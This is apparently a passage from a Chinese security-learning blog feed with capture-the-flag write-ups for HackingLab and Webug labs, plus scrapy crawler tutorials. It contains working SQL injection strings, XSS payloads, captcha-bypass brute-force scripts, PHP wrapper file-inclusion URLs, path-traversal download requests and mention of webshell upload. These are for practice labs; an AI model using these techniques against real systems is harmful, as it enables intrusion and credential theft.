1http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/?userid=1&amp;pwd=ffifdyop 这样就可以得到flag了。 Ps：ffifdyop用MD5加密后的值为：276f722736c95d99e921722cf9ed621c，再转成字符串值为： 1&apos;or&apos;6&lt;trash&gt; 总结刷完这套SQL注入题，解锁了很多新的姿势，尤其是limit注入，图片注入，以及hash密码注入 接下来的学习是将后面的上传关和解密关综合关刷完，再学一下docker使用，慢慢开始学习日站]]></content>
      <tags>
        <tag>Write Up</tag>
        <tag>Owasp top 10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HackingLab_脚本关WP]]></title>
    <url>%2F2017%2F10%2F13%2FHackingLab-%E8%84%9A%E6%9C%AC%E5%85%B3WP%2F</url>
    <content type="text"><![CDATA[无意间找到了以前做过的网络安全实验室平台，里面有个脚本关还不错，对于我这种python菜得扣脚的人来说是个很好的锻炼机会，天也不早了，开撸 key又又找不到了这是原来做过的ctf题，直接用bp抓包能看到flag的响应。 flag虽然是拿到了，但是还是通过手写python脚本来拿这个flag吧#(傲娇脸) 先分析整个过程，进入题目，然后点击链接，注意，这个链接被重定向了，所以我们需要抓住被重定向之前的页面，脚本如下： 12345678910# -*- coding:utf-8 -*-import urllib2url = &apos;http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php&apos;#user_agent = &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;&quot;#headers = &#123;&quot;User-Agent&quot;:user_agent&#125;req = urllib2.Request(url) #,headers = headers#)response = urllib2.urlopen(req)res = response.read()print res 快速口算题目要求：在两秒内口算出结果并提交，哇用计算器也来不及啊，别说口算了，上脚本吧。 先分析下思路：先爬取网页源码，再用正则匹配算式，将结果提交到POST框，最后将flag抓取并打印出来。 但是这个运算结果如何提交上去呢，POST参数不明，于是利用bp抓包，发现参数为v，那么思路就清晰了，代码如下： 123456789101112# -*- coding:utf-8 -*-import reimport requestsurl = &apos;http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&apos;header = &#123;&apos;Cookie&apos;: &apos;PHPSESSID=69710583de37066c12925fd1b531a022&apos;&#125;contents = requests.get(url, headers = header).content.decode(&apos;utf-8&apos;)matches = re.search(&quot;(.+)=&lt;(input)&quot;, contents)data = &#123;&apos;v&apos;: str(eval(matches.group(1)))&#125;contents = requests.post(url, headers=header, data=data).content.decode(&apos;utf-8&apos;)matches = re.search(&quot;&lt;body&gt;(.*)&lt;/body&gt;&quot;, contents)print(matches.group(1)) 这个题目是空的要求交一个空答案上去，直接提交不行，那试试null，成功 总结了一些能代表空的字符： 1null,none,%0a,%0b,%0c,%0d,%0a%0d,%a0 怎么就是不弹出key呢？这道题源码有点乱，复制到sublime里，稍微整理了一下，是js代码，发现几乎看不懂….亏自己还写过js版的别踩白块，js只是都快忘完了。看来需要抽空恶补一下js了。 看了下别人的wp，原来是一开始的三个函数返回false的原因，将代码复制到本地运行一下，把弹窗的前14个字符截取下来就是flag了 逗比验证码第一期看了下题目，觉得不可能实现啊，现在的顶尖ai技术识别图形化的验证码成功率也不是100%啊，觉得很蒙逼，好吧再偷偷看下wp，原来这个验证码允许提交多次密码，只要页面不刷新验证码就不会重新生成。将信将疑用bp验证一下，果然能爆破出密码来，于是自己写脚本： 12345678910111213141516171819202122# -*- coding:utf-8 -*-import requestsimport reurl = &apos;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php&apos;header = &#123; &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&apos;, &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;, &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;, &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;, &apos;Content-Length&apos;: &apos;40&apos;, &apos;Referer&apos;: &apos;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php&apos;, &apos;Cookie&apos;: &apos;PHPSESSID=f9ee03381c2ebea72b7afb61b53b7b31&apos;, &apos;X-Forwarded-For&apos;: &apos;127.0.0.1&apos;, &apos;Connection&apos;: &apos;close&apos;, &apos;Upgrade-Insecure-Requests&apos;: &apos;1&apos;&#125;for i in range(1000,9999): data = &#123;&apos;username&apos; : &apos;admin&apos;, &apos;pwd&apos; : i, &apos;vcode&apos; : &apos;PGCF&apos;, &apos;submit&apos; : &apos;submit&apos;&#125; contents = requests.post(url = url, headers = header, data = data).content.decode(&apos;utf-8&apos;) k = contents if not &apos;error&apos; in k: print(&quot;%d : %s&quot;%(i, contents)) 本来想在最后一个输出语句之前加个正则匹配，直接输出flag的，但是因为题目的原因，不能看到提交密码后页面的源码，不清楚该如何匹配，所以就只能都输出了 ps:url那里千万要写成登陆后的url，即login.php，如果写成index.php返回的不是登陆结果，而是主页源代码 逗比验证码第二期这次比上次难，验证码只能用一次，那岂不是没办法了，开启多线程？好吧再偷偷看一眼wp，最后一次！ ….你特么在逗我，第一次验证后，后面验证码为空就可以接着验证，同样爆破，我特么！ 好吧好吧怪自己不够细心 代码和上一道题类似： 123456789101112131415161718192021222324252627282930# -*- coding:utf-8 -*-import requestsimport reurl = &apos;http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php&apos;header = &#123; &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&apos;, &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;, &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;, &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;, &apos;Content-Length&apos;: &apos;40&apos;, &apos;Referer&apos;: &apos;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php&apos;, &apos;Cookie&apos;: &apos;PHPSESSID=f9ee03381c2ebea72b7afb61b53b7b31&apos;, &apos;X-Forwarded-For&apos;: &apos;127.0.0.1&apos;, &apos;Connection&apos;: &apos;close&apos;, &apos;Upgrade-Insecure-Requests&apos;: &apos;1&apos;&#125; for i in range(1200,9000): if(i == 1200): data = &#123;&apos;username&apos; : &apos;admin&apos;, &apos;pwd&apos; : i, &apos;vcode&apos; : &apos;8F9K&apos;, &apos;submit&apos; : &apos;submit&apos;&#125; contents = requests.post(url = url, headers = header, data = data).content.decode(&apos;utf-8&apos;) k = contents if not &apos;error&apos; in k: print(&quot;%d : %s&quot;%(i, contents)) else: data = &#123;&apos;username&apos; : &apos;admin&apos;, &apos;pwd&apos; : i, &apos;vcode&apos; : &apos;&apos;, &apos;submit&apos; : &apos;submit&apos;&#125; contents = requests.post(url = url, headers = header, data = data).content.decode(&apos;utf-8&apos;) k = contents if not &apos;error&apos; in k: print(&quot;%d : %s&quot;%(i, contents)) 逗比验证码第三期有个Tips：SESSION 哇这个又是什么原理，果然还是读书太少，最后最后一次看下WP 灌水机？找了下原理： 1不使用表单页面，直接模拟POST向服务端程序发送数据，验证码模块没有被调用，所以cookie和session存储的加密验证码就是上次的值，也就是没有更新，这样以后无限次的通过post直接发送的数据，而不考虑验证码，验证码也就失效 验证码发布流程： 123451.显示表单2.显示验证码（调用生成验证码的程序），将验证码加密后放进session或cookie3.用户提交表单4.核对验证码无误，数据合法后写入数据库用户如果再发布一条，正常情况下，会再次访问表单页面，验证码图片被动更新， session 和 cookie 也就跟着变了 解决方案： 1在核对验证码后先将 session 和 cookie 的值清空，然后做数据合法性判断，然后入库 原理的意思应该是只有第一次用到了验证码，后面的直接通过post提交，绕过了验证码机制，和上一题类似，脚本代码如下： 12345678910111213141516171819202122# -*- coding:utf-8 -*-import reimport requestsurl = &apos;http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php&apos;header = &#123; &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&apos;, &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;, &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;, &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;, &apos;Content-Length&apos;: &apos;46&apos;, &apos;Referer&apos;: &apos;http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php&apos;, &apos;Cookie&apos;: &apos;PHPSESSID=e8250c71fc86de7f0b4fba61c39ce0fd&apos;, &apos;X-Forwarded-For&apos;: &apos;127.0.0.1&apos;, &apos;Connection&apos;: &apos;close&apos;, &apos;Upgrade-Insecure-Requests&apos;: &apos;1&apos;&#125;for i in range(1000,9999): data = &#123;&apos;username&apos;:&apos;admin&apos;,&apos;pwd&apos;:i,&apos;vcode&apos;:&apos;&apos;,&apos;submit&apos;:&apos;submit&apos;&#125; contents = requests.post(url = url, headers = header, data = data).content.decode(&apos;utf-8&apos;) if not &apos;error&apos; in contents: print(&quot;%d : %s&quot;%(i, contents)) 微笑一下就能过关了发现可以查看源码： 12345678910111213141516171819202122232425262728&lt;?php header(&quot;Content-type: text/html; charset=utf-8&quot;); if (isset($_GET[&apos;view-source&apos;])) &#123; show_source(__FILE__); exit(); &#125; include(&apos;flag.php&apos;); $smile = 1; if (!isset ($_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/\./&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/%/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/[0-9]/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/http/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0; if (preg_match (&apos;/https/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0; if (preg_match (&apos;/ftp/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/telnet/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/_/&apos;, $_SERVER[&apos;QUERY_STRING&apos;])) $smile = 0; if ($smile) &#123; if (@file_exists ($_GET[&apos;^_^&apos;])) $smile = 0; &#125; if ($smile) &#123; $smile = @file_get_contents ($_GET[&apos;^_^&apos;]); if ($smile === &quot;(●&apos;◡&apos;●)&quot;) die($flag); &#125; ?&gt; 哇这个审计题就很难受了，看了好久没看明白，因为有几处矛盾的地方: QUERY_STRING不允许有底斜杠，但是GET参数就有底斜杠 file_exists函数不能指向一个文件，但是file_get_contents函数却必须要读取一个文件，并且文件内容为(●’◡’●) 就只能再看一次WP了 (:3 」∠) wp的思路为： 121.当.或[]之类的符号作为参数的key的时候，会被PHP改写为_，但由于QUERY_STRING为用用户提交的内容，所以不修改2.file_get_contents函数可以远程获取数据，但常用网络协议已经被正则过滤，因此需要选其其他协议，查询PHP支持的协议和包装发现data协议可用，巧合的是file_exists函数对于data指向的内容判断为不存在 wp也有点问题，稍加修改最终版： 123456#-*- coding:utf-8 -*-import urllib,requestsurl = &apos;http://1.hacklist.sinaapp.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?^.^=php://input&apos;header = &#123;&apos;Cookie&apos;: &apos;PHPSESSID=e8250c71fc86de7f0b4fba61c39ce0fd&apos;&#125;content = requests.post(url = url, data = urllib.unquote(&quot;%28%E2%97%8F%27%E2%97%A1%27%E2%97%8F%29&quot;), headers = header).content.decode(&apos;utf-8&apos;)print content 逗比的手机验证码进入题目有一个获取手机验证码的按钮，获取验证码后提交显示用另一个手机号登陆，换成另一个手机号后就拿到flag了，虽然题目简单，但是还是用脚本来实现试试 思路：抓取弹窗的内容，然后用指定手机号和验证码提交，并输出flag 关于弹窗的抓取还没接触过，还是先学习一波 激情燃烧的岁月点击获取验证码提示验证码为三位数字，直接用bp爆破，结果是出来的是女朋友的电话号码，接着爆破，出来的就是flag了。老规矩，还是自己写脚本尝试一下 思路：先爆破出女朋友号码，再将女朋友号码提交到post框爆破出flag 12345678910#-*-coding:utf-8 -*-import requestsurl = &apos;http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php&apos;header = &#123;&apos;Cookie&apos; :&apos;PHPSESSID=894c0046842e767500b2580bd49d859f&apos;&#125;for i in range(100,1000): data = &#123;&apos;username&apos;:&apos;13388886666&apos;,&apos;vcode&apos;:i, &apos;Login&apos;:&apos;submit&apos;&#125; contents = requests.post(url, headers = header, data = data).content.decode(&apos;utf-8&apos;) if not &apos;error&apos; in content: print(&quot;%d : %s&quot;%(i, contents)) break 一开始将i写成了’i’，检查了半个小时都没检查不出来错误，心态都要炸了，吃一堑长一智 然后可以将原数据改为女朋友的号码重新爆破一次，得到flag 验证码识别手机验证码+图片验证码，猜测应该是和前面一样，图片验证码应该存在问题，不然肯定不能用脚本爆破。 进去点击获取验证码，弹窗内容为：验证码已经发送到您的手机！没说多少位，看看源码，源码提示说三位，好吧上脚本： 12345678# -*- coding:utf-8 -*-import requestsurl = &apos;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php&apos;header = &#123;&apos;Cookie&apos;:&apos;PHPSESSID=42d05bda65f8ca7b0b28fbeec28c3601&apos;&#125;for i in range(100,1000): data = &#123;&apos;username&apos;:&apos;13388886666&apos;, &apos;mobi_code&apos;:i, &apos;user_code&apos;:&apos;5406&apos;, &apos;Login&apos;:&apos;submit&apos;&#125; contents = requests.post(url = url, headers = header, data = data).content.decode(&apos;utf-8&apos;) print (&quot;%d : %s&quot;%(i, contents)) 但是不行爆破不出来，用bp也没爆破出来，难道需要什么骚操作？ wp上说要用图像识别…..好吧又可以涨一波姿势了，使用步骤： 12345671.首先登陆，密码验证码随便填，然后用bp抓包2.将抓到的包丢进PKav HTTP Fuzzer的变体设置，标记好密码和验证码（下面有添加和清除标记的按钮，注意区分添加标记和添加验证码标记）3.添加字典4.添加验证码地址，将鼠标悬停在验证码上右键单击复制图片链接，然后粘贴在验证码地址栏，本题的验证码为纯数字，就把字符限定为01234567895.来到重放选项，设置为无条件跟踪重定向（这一步视情况而定）6.当验证码的识别成功率达不到100%时，我们需要设置&quot;重试规则&quot;，在规则列表中添加如&quot;验证码错误&quot;等提示（视情况而定）7.来到发包器这里，点击启动，然后根据判断访问的长度，确定是否成功 也有用python3的，据说里面Pillow（依赖libjpeg和zlib） 和 pytesseract(依赖tesseract-ocr)这两个库很强大 但是没爆破出来，估计是验证码识别问题 xss基础关真的很基础，直接构造，一道水题 xss基础2：简单绕过简单测试，发现提示 1Welcome XSS_SCRIPT_DETECTED!!! 估计是script被过滤了，那用事件试试： 1&lt;img src=# onerror=alert(HackingLab)&gt; 成功弹窗 xss基础3：检测与弹窗简单测试还是一样的提示，但是多次测试发现,当构造value值为alert时，后面的事件语句不会被过滤，构造语句： 1alert&apos; onmouseenter=alert(HackingLab)&gt; 成功弹窗 Principle很重要的XSS搞清楚了整个流程，是在框里输入内容，然后提交查询后，输入的内容会转为一个同级目录下的连接。 既然思路清楚了，那剩下的就是构造语句了,经过测试，script和img及很多关键词被过滤了，编码也绕过不了，网上也没看到wp，先给自己挖个坑吧 总结这些脚本关总的来说还是不错，锻炼了本菜鸡的脚本能力，至少写个简单的py脚本没问题了，后面的路还长]]></content>
      <tags>
        <tag>Write Up</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP伪协议]]></title>
    <url>%2F2017%2F10%2F10%2FPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[上次班上大佬出的一道远程文件包含题，需要用到php的data协议，并且原来也遇到过几次php协议的ctf题，本菜鸡在这里整理（抄袭）一下那些php伪协议，记录下来，以备不时之需。 file://协议此协议在allow_url_fopen和allow_url_include关闭的情况下也能使用。 file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响（使用时要用绝对路径） 例子： 1http://127.0.0.1/?file=file://D:/phpStudy/WWW/1.txt php://协议不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。 php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 php://filter在allow_url_fopen 和allow_url_include都关闭的情况下也可以使用。 比如在bugku里有一道题就用到了php协议： 1?file=php://filter/read=convert.base64-encode/resource=index.php php://input可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。（allow_url_include需要开启） 12http://127.0.0.1/?file=php://input[POST DATA] &lt;?php phpinfo()?&gt; zip://, bzip2://, zlib://协议zip://, bzip2://, zlib://协议在allow_url_fopen和allow_url_include关闭的情况下也能使用。 zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。 zip://协议先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。（只能用相对路径） 1http://127.0.0.1/?file=zip://D:/phpStudy/WWW/file.jpg%23phpcode.txt bzip2://协议1http://127.0.0.1/cmd.php?file=compress.bzip2://D:/phpStudy/WWW/file.jpg or 1http://127.0.0.1/?file=compress.bzip2://D:/phpStudy/WWW/file.jpg zlib://协议1http://127.0.0.1/?file=compress.zlib://D:/phpStudy/WWW/file.jpg or 1http://127.0.0.1/?file=compress.zlib://./file.jpg data://协议data://协议必须在allow_url_fopen和allow_url_include都开启的情况下才能使用。 1http://127.0.0.1/?file=data://text/plain,&lt;?php phpinfo()?&gt; or编码一下: 1http://127.0.0.1/?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=&gt;]]></content>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Webug渗透基础(二)]]></title>
    <url>%2F2017%2F09%2F30%2FWebug(2)%2F</url>
    <content type="text"><![CDATA[昨晚遇到的那道“这关需要用RMB购买哦”，下面的提示是： 1支付问题：用最少的钱去购买 应该就是考逻辑漏洞，抓包去改价格为0 开搞 越权下面给了个测试账号 12username:tompassword:123456 进入题目是一个登陆页面，登陆试试。 登陆成功是修改密码的页面。 修改密码试试，显示修改成功，请重新登陆。 还是没思路，看看源码试试。 里面有个info.txt，说减少验证用户名密码的正确性，意思是不用原密码来改密码？试试 试了几次发现：在旧密码那里输入一个永真的条件就能改密码，而输入一个假条件就会跳转到空白页 所以这就是漏洞么 CSRF好吧终于来了，一直想找csrf的题练一下 查看源码没发现，用原来那个账号登陆进去还是跟上一道题一样修改密码 但是我发现这道题没有验证旧密码的步骤，直接修改，这么恐怖的么 难道是修改管理员的密码？但是登陆都登陆不进去啊 看看wp，只是通过bp生成一个poc，管理员打开就GG，这道题没有flag url跳转又是熟悉的界面熟悉的味道，修改密码，但是这次修改密码直接跳转了，而且是一个404页面 想到前面某题有个url参数，会不会是那个 后面已经有了个name参数了，用&amp;符号连接，构造： 1?name=tom&amp;url=change.php 跳转到一个改密码页面，估计这道题的意思是通过url跳转，绕过限制修改密码 文件下载进入题目显示404，估计又是靶场的锅，看看路径，重新构造一下 1http://127.0.0.1/pentest/test/6/1/download.php 进入题目有两个图片和下载按钮 点击下载显示不能找到此文件，源码里面有帮管理员找回账号密码 注意到title为帮管理员找回mysql账号密码 开始想到是sql注入，后来发现不存在注入点 那估计就是利用文件下载漏洞来下载数据库了 利用目录扫描工具来扫描下目录（直接在url上查看，毕竟是本地环境哈哈哈） 发现同级目录有个data目录和一个db目录，data文件里是那两张图片，而db目录里是config.php 而且进入那个config.php会报错，并且把绝对路径给爆出来了： 1C:\phpStudy\WWW\pentest\test\6\1\db\config.php 那我们可以将这个文件下载下估计就可以找回mysql账号密码了 但是当构造： 1http://127.0.0.1/pentest/test/6/1/download.php?fname=db/phpconfig.php 报错信息： 1Can not find file: C:/phpStudy/WWW/topsec/any_file_download_V1.2/data/db/phpconfig.php 说明在源代码里路径被强制改了，我们用相对路径： 1http://127.0.0.1/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php 成功下载文件，可以利用这个思路下载任意文件了，前提是你知道路径 打开下载的config.php，里面就是账号密码 我和上一题有点像确实和上一题有点像，多了个选择框， 上一道题还好，还告诉了参数名，这道题题参数名都没有 没有参数，创造参数也要上，抓包吧，虽然操蛋的虚拟机抓不到包，看看wp的包截图就行 除了参数名，其他操作一样的，出题人有点懒啊。但是能得到这样的靶场已经很知足了，辛苦了出题人 我系统密码忘记了下面有个提示，说 1请帮我找回在D盘下 OK进入题目，是一个上传，上传漏洞？还是包含漏洞？ 先上传一个一句话木马试试 上传成功还给出了存储路径，这不是红果果的被菜刀砍么，上菜刀 但是我还是太年轻啊，给出的路径就是扯淡的，注意到下面的direcotrt list有个upload文件夹，连接菜刀果然是这个 但是D盘访问不了，估计是没权限，那么提权吧，但是我不会啊啊哈哈哈哈哈哈 看看wp吧，顺便学习一下 关于提权后面专门学习一下，这里先略过 XSS到了最喜欢的XSS了 进入题目是一个666连接 直接修改get参数为： 1?id=&lt;script&gt;alert(123)&lt;/script&gt; 就弹窗了，这不是这个位置该有的难度啊 存储型XSS刚进去就弹窗了，然后查看下源码直接构造： 1&lt;script&gt;alert(123)&lt;/script&gt; 这就弹窗了，确实对这两道XSS挺失望的 什么？图片上传不了？先上传个php文件，被拦截了 再上传个jpg文件，上传成功，但是没有路径并且说他不喜欢换一下，所以推测是bp抓包上传 不能抓包就看看源码，确实是需要抓包改后缀，bingo 明天双十一不愧为渗透基础的最后一道题，简直摸不着头脑，还是去看看源码吧 123456if($url!=null||$url!=&quot;&quot;)&#123; if(strstr($url,&quot;www.taobao.com&quot;))&#123; if($_SERVER[&apos;HTTP_HOST&apos;]==&quot;10.10.10.10&quot;)&#123; if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123; if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123; echo &quot;剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0&quot;.&quot;&lt;br/&gt;&quot;; 关键在这 抓包改一下就出来了 总结：题目还是很基础，自己基本功还是不够扎实，特别是提权那里，下来需要花点时间学习一下。 先去吃饭，下午开始撸中级进阶题]]></content>
      <tags>
        <tag>Write Up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Webug渗透基础(一)]]></title>
    <url>%2F2017%2F09%2F29%2FWebug(1)%2F</url>
    <content type="text"><![CDATA[webug3发布，作为菜鸡的我肯定不能放过这个锻炼的好机会，花了两天时间下载好，废话不多说，开干 很简单的一个注入进入题目已经告诉了参数?gid=1 单引号测试报错，其他显示正常，所以推测原sql查询语句的参数有一对单引号包裹 测试字段数： 1?gid=1&apos; and 1=1 order by x--+ 测试回显位置： 1?gid=1&apos; and 1=1 union select 1,2,3,4--+ 查询数据库： 1?gid=1&apos; and 1=1 union select 1,2,3,database()--+ 查询表名： 1?gid=1&apos; and 1=1 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()--+ 查询列名： 1?gid=1&apos; and 1=1 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=&apos;flag&apos;--+ 查询字段名： 1?gid=1&apos; and 1=1 union select 1,2,group_concat(flag), 4 from flag--+ 拿到flag 从图片中你还能找到什么？进入题目是一张图片，下载下来用winhex打开，没发现什么线索。 将后缀改为.zip，发现里面有一个123.txt，里面有密码123，提交flag显示不对。 猜测是包里还有另外一个包，解压密码就是123。 于是用到kali的binwalk： 1binwalk 123.jpg 结果显示里面还有一个rar文件，利用dd命令分离： 1dd if=123.jpg of=123.rar skip=4396 bs=1 结果打开分离出来的rar文件，就是之前改后缀得到的那个……. 没了思路，去看了下wp，结果是靶场的问题。。。。 你看到了什么？进去题目里就有一个flag，这总肯定不能信了，提交果然是错的。 查看源码提示扫一下目录，但是这个虚拟机不能用御剑，DirBuster-0.12又不会用，所以就用最屌丝的做法，直接返回上一级目录，谁叫这是本地环境呢#(滑稽) 里面除了题目的主页还有两个文件夹，第一个打开有弹窗： 1flag&#123;人人都知道站长是个大帅比&#125; 提交是错的 打开后面那个文件夹，提示将目录名md5加密： 1flag&#123;098f6bcd4621d373cade4e832627b4f6&#125; 提交还是不对，查看wp是说前面得到的那个flag是正确的，还是环境的锅…… 告诉你了flang是五位数：目测是爆破，但是进入题目是一个登陆页面，用户名和密码都是未知，爆破可不太可能啊，试试弱密码。 试了几次得到账号密码为： 12username:adminpassword:admin123 但是只显示了登陆成功，并没有得到flag。。。。 查看源码发现flag被注释掉了。。。。。巨坑！ 可能只是考一下弱密码吧呵呵呵 一个有点小小的特殊的注入：没告诉参数是什么，试了下id和uid都没反应 抓包试试，发现不知道为什么不能抓包#(吐血) 猜测可能是cookie或者x-forward-for注入之类的。 去看看源码吧，当代码审计题做。 12345#x-forword-for:yjsif (isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;])) &#123; echo &quot;你改变了浏览器发送的数据，并输入了&quot;.$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]; $query=$query.$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];&#125; 看样子是x-forward-for注入 而且是x-forward-for的内容是接在select * from goods后面，所以就简单了，直接上最终payload：将x-forward-for的内容改为：union select 1,2,3，group_concat(flag) from flag 竟然是一模一样的，我怀疑就是用的第一题的 这关需要RMB购买哦：进入页面是一个登陆页面，查看源码发现有一句注释： 1&lt;!--&lt;a href=&quot;index.php?url=#&quot;&gt;I&lt;/a&gt;--&gt; 将index.php?url=#加在url后面，把#改为任意数字，都是显示跳转成功 注意到报错页面： 1The requested URL /pentest/test/2/www.baidu.com was not found on this server. 要是我把url参数的值传入一个值跳转到一个存在的页面，是不是就能得到flag了呢 试了很多没用，很不要脸的去数据库看了账号密码，好歹你给个测试账号也行啊。。。。。 12username:tompassword:123456 进入后是一个类似购物商城的页面，随便购买一下，mmp钱给我减少了！flag还没拿到钱就给我减了？ 抓包试试，将价格改为-1，alert出一个框：不要白拿书。卧槽 确实不知道这道题要考什么，问了下大佬也没思路。 好了回寝室了，剩下的明天再撸]]></content>
      <tags>
        <tag>Write Up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫（四）图片爬取实战]]></title>
    <url>%2F2017%2F09%2F28%2Fscrapy(3)%2F</url>
    <content type="text"><![CDATA[老规矩先编写items.py确定目标：123456# -*- coding: utf-8 -*-import scrapyclass DouyuItem(scrapy.Item): nickname = scrapy.Field() imagelink = scrapy.Field() 编写爬虫文件：12345678910111213141516171819202122232425262728# -*- coding: utf-8 -*-import scrapyimport jsonfrom Douyu.items import DouyuItemclass DouyuSpider(scrapy.Spider): name = &apos;douyu&apos; allowed_domains = [&apos;douyucdn.cn&apos;] baseURL = &quot;http://capi.douyucdn.cn/api/v1/getVerticalRoom?limit=20&amp;offset=&quot; offset = 0 start_urls = [baseURL + str(offset)] def parse(self, response): data_list = json.loads(response.body)[&apos;data&apos;] if len(data_list) == 0: return for data in data_list: item = DouyuItem() item[&apos;nickname&apos;] = data[&apos;nickname&apos;] item[&apos;imagelink&apos;] = data[&apos;vertical_src&apos;] yield item self.offset += 20 yield scrapy.Request(self.baseURL + str(self.offset), callback = self.parse) 修改设置文件：设置文件存储目标位置：1IMAGES_STORE = &quot;/home/67/桌面/test/scrapy/Douyu/Data&quot; 加上User-Agent头:1USER_AGENT = &apos;Mozilla/5.0 (iphone; U; CPU iphone OS 2_0 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A347 Safari/525.200&apos; 将1ROBOTSTXT_OBEY = Ture 改为：1ROBOTSTXT_OBEY = False 打开任务进程：123ITEM_PIPELINES = &#123; &apos;Douyu.pipelines.DouyuPipeline&apos;: 300,&#125;]]></content>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫（三）文字信息爬取实战]]></title>
    <url>%2F2017%2F09%2F28%2Fscrapy(2)%2F</url>
    <content type="text"><![CDATA[title: 爬虫（三）记一次scrapy爬取腾讯招聘信息author: 67tags: 编程categories: []date: 2017-09-28 17:48:00 先访问网站，发现有职位名称、职位类别、人数、低点、发布时间等 先编写items.py文件，确定爬取内容：1234567891011121314151617181920212223# -*- coding: utf-8 -*-import scrapyclass TencentItem(scrapy.Item): #职位名称 positionName = scrapy.Field() #职位详情连接 positionLink = scrapy.Field() #职位类别 positionType = scrapy.Field() #招聘人数 peopleNumber = scrapy.Field() #工作地点 workLocation = scrapy.Field() #发布时间 publishTime = scrapy.Field() 接着编写爬虫：1234567891011121314151617181920212223242526272829303132333435# -*- coding: utf-8 -*-import scrapyfrom Tencent.items import TencentItemclass TencentSpider(scrapy.Spider): name = &apos;tencent&apos; allowed_domains = [&apos;tencent.com&apos;] baseURL = &quot;http://hr.tencent.com/position.php?&amp;strat=&quot; offset = 0 start_urls = [baseURL + str(offset)] def parse(self, response): node_list = response.xpath(&quot;//tr[@class=&apos;even&apos;] | //tr[@class=&apos;odd&apos;]&quot;) for 